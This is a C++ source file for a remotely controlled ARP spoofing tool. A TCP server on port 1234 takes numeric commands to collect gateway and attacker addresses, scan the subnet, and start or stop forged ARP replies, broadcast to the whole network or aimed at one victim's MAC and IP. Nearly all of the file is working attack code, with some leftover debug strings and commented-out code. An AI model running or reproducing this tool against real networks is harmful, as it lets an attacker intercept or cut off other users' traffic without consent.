#include <stdio.h>
#include "get_info.h"
#include "socket.h"
#include "arp_spoof.h"
#include <map>

int server_sock, client_sock;

volatile bool broad_run = false;

GW_info gw_info;
ATTACKER_info attacker_info;

static DEV_info ap_info;
static std::map<MAC, DEV_info> dev_list;

void change_mac(char * str_mac, uint8_t * mac){
    char *ptr = strtok(str_mac, ":");   
    int i = 0;

    while (ptr != NULL)
    {
        mac[i] = (uint8_t)strtol(ptr, NULL, 16);
        ptr = strtok(NULL, ":");
        i++;
    }
}

void stop_attack(pcap_t * handle, DEV_info dev){
    ARP_Packet * p = (ARP_Packet *)dev.attack_pkt;
    memcpy(p->arp.sender_mac, gw_info.mac, sizeof(gw_info.mac));
            
    for(int i=0; i<3;i++){
        if(pcap_sendpacket(handle, dev.attack_pkt, sizeof(ARP_Packet))!=0){
            return;
    }
    sleep(1);
    }
    pcap_close(handle);
}

void start_attack(pcap_t * handle, DEV_info dev, int is_dev, MAC key){
    pcap_pkthdr * header;
    const u_char * rep;
    ARP_Packet * pkt_ptr;
    int check_dev;
    while(1){
        if(is_dev == 0) {
            check_dev = ap_info.is_attack;
        } else{
            check_dev = dev_list.find(key)->second.is_attack;
        }            
        
        if(check_dev == 0){
            break;
        }

        if(pcap_sendpacket(handle, dev.attack_pkt, sizeof(ARP_Packet))!=0){
            
        }
        sleep(1.5);
        // int ret = pcap_next_ex(handle, &header, &rep);

        // if(ret == 0 || ret == -1){
        //     continue;
        // }

        // pkt_ptr = (ARP_Packet *)rep;
        
        // if(ntohs(pkt_ptr->eth.ether_type) == 0x0806){
        //     printf("gw IP : %d.%d.%d.%d\n", (this->sender_ip)&0xFF, (this->sender_ip>>8)&0xFF, (this->sender_ip>>16)&0xFF, (this->sender_ip>>24)&0xFF);
        //     printf("sender IP : %d.%d.%d.%d\n", (pkt_ptr->arp.sender_ip)&0xFF, (pkt_ptr->arp.sender_ip>>8)&0xFF, 
        //     (pkt_ptr->arp.sender_ip>>16)&0xFF, (pkt_ptr->arp.sender_ip>>24)&0xFF);
        //     printf("target IP : %d.%d.%d.%d\n", (pkt_ptr->arp.target_ip)&0xFF, (pkt_ptr->arp.target_ip>>8)&0xFF, 
        //     (pkt_ptr->arp.target_ip>>16)&0xFF, (pkt_ptr->arp.target_ip>>24)&0xFF);
        // }
        
        // if(ntohs(pkt_ptr->eth.ether_type) == 0x0806 && 
        //     (pkt_ptr->arp.sender_ip == this->sender_ip || pkt_ptr->arp.target_ip == this->sender_ip)){
        //     for(int i = 0; i < 4; i++){
        //         if(pcap_sendpacket(handle, this->attack_pkt, sizeof(ARP_Packet))!=0){
        //             printf("[-] couldn't send attack pkt\n");
        //             continue;
        //         }
        //         strcpy(data, "[+] success to send attack pkt");
        //     }
        // }
    }
    stop_attack(handle, dev);
}

int main(){
    
    int server_port = 1234;
    uint32_t broad_ip = 0;
    uint8_t broad_mac[6];
    memset(broad_mac, 0xff, sizeof(uint8_t)*6);

    //socket connection
    if ((server_sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0){
        printf("socket create error\n");
        return -1;
    }

    int option = 1;
    if (setsockopt(server_sock, SOL_SOCKET, SO_REUSEADDR, &option, sizeof(option)) < 0){
        printf("socket option set error\n");
        return -1;
    }

    struct sockaddr_in server_addr, client_addr;
    memset(&server_addr, 0x00, sizeof(server_addr));
    memset(&client_addr, 0x00, sizeof(client_addr));
    int client_addr_size = sizeof(client_addr);
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(server_port);

    if (bind(server_sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0)
    {
        printf("bind error\n");
        return -1;
    }

    if (listen(server_sock, 5) < 0)
    {
        printf("listen error\n");
        return -1;
    }

    if ((client_sock = accept(server_sock, (struct sockaddr *)&client_addr, (socklen_t *)&client_addr_size)) < 0)
    {
        printf("accept error\n");
    }

    printf("[+] connection ok\n");

    char errbuf[PCAP_ERRBUF_SIZE];

    char rdata[1024] = {0,};
    char sdata[1024] = {0,};

    uint32_t subnet;

    while(1){
        printf("htehaktsfkjsdlfjskldfjklsjfklsjdflkd\n");
        memset(rdata, 0x00, BUF_SIZE);
        recv_data(client_sock, rdata);
        int signal = atoi(&rdata[0]);
        printf("request num >> %d\n", signal);

        // 1. get basic informations
        if(signal == 1){
            save_iface_name(gw_info.iface_name);
            save_gw_ip(&gw_info.ip);
            save_my_ip(&attacker_info.ip);
            save_my_mac(gw_info.iface_name, attacker_info.mac);
            save_gw_mac(gw_info.iface_name, gw_info.mac);
            print_ip(gw_info.ip);
            print_ip(attacker_info.ip);
            print_mac(attacker_info.mac);

            subnet = get_subnet(gw_info.iface_name);
            printf("????????????????????\n");
            char str_subnet[30] {0, };
            sprintf(str_subnet, "%d.%d.%d.%d\n", (subnet)&0xFF, (subnet >> 8) & 0xFF, (subnet >> 16) & 0xFF, (subnet >> 24) & 0xFF);
        }
        
        // 2. broadcast attack signal
        if(signal == 2){
            ap_info.attacker_ip = gw_info.ip;
            memcpy(ap_info.attacker_mac, attacker_info.mac, sizeof(uint8_t)*6);
            ap_info.victim_ip = broad_ip;
            memcpy(ap_info.victim_mac, broad_mac, sizeof(uint8_t)*6);


            ap_info.handle = pcap_open_live(gw_info.iface_name, BUFSIZ, 1, 1000, errbuf);
            if (ap_info.handle == NULL) {
                return -1;
            }

            // make attack packet
            ARP_Packet * arp_data = (ARP_Packet *)malloc(sizeof(ARP_Packet));
            make_arp_packet(ap_info.victim_mac, ap_info.attacker_mac, 0x2, ap_info.attacker_ip, ap_info.victim_ip, arp_data);
            memcpy(ap_info.attack_pkt, arp_data, sizeof(ARP_Packet));

            ap_info.is_attack = 1;
            MAC null_mac;
            memset(null_mac.mac, 0x00, sizeof(uint8_t)*6);

            std::thread attack_thread(start_attack, ap_info.handle, ap_info, 0, null_mac);
            attack_thread.detach();
            free(arp_data);
        }
        // 3. scan devices
        if(signal == 3){
            std::thread scan_thread(scan_pkt_check, client_sock);
            scan_thread.detach(); 

            std::thread scan_send_thread(scan_pkt_send, client_sock, subnet);
            scan_send_thread.detach();
        }
        // 4. unicast attack
        if(signal == 4){
            DEV_info dev;
            MAC key;
            char *ptr = strtok(rdata, "\t");   

            ptr = strtok(NULL, "\t");
            char temp[25] = {0,};
            uint8_t rmac[6] = {0,};
            memcpy(temp, ptr, strlen(ptr));

            ptr = strtok(NULL, "\t");
            dev.victim_ip = inet_addr(ptr);

            change_mac(temp, dev.victim_mac);
            memcpy(key.mac, dev.victim_mac, sizeof(uint8_t)*6);

            dev.attacker_ip = gw_info.ip;
            memcpy(dev.attacker_mac, attacker_info.mac, sizeof(uint8_t)*6);

            dev.handle = pcap_open_live(gw_info.iface_name, BUFSIZ, 1, 1000, errbuf);
            if (dev.handle == NULL) {
                return -1;
            }

            // make attack packet
            ARP_Packet * arp_data = (ARP_Packet *)malloc(sizeof(ARP_Packet));
            make_arp_packet(dev.victim_mac, dev.attacker_mac, 0x2, dev.attacker_ip, dev.victim_ip, arp_data);
            memcpy(dev.attack_pkt, arp_data, sizeof(ARP_Packet));

            dev.is_attack = 1;
            dev_list.insert(std::pair<MAC, DEV_info>(key, dev));

            std::thread attack_thread(start_attack, dev.handle, dev, 1, key);
            attack_thread.detach();
            free(arp_data);

        }

        // 5. stop broadcast attack signal
        if(signal == 5){
            ap_info.is_attack = 0;
        }

        // 6. stop unicast attack signal
        if(signal == 6){
            char *ptr = strtok(rdata, "\t");   

            ptr = strtok(NULL, "\t");
            MAC find_mac;

            change_mac(ptr, find_mac.mac);

            std::map<MAC, DEV_info>::iterator iter = dev_list.find(find_mac);
            if(iter != dev_list.end()){
                iter->second.is_attack = 0;
                sleep(3);
                dev_list.erase(find_mac);
            }
        }
    }
    close(client_sock);
    close(server_sock);
}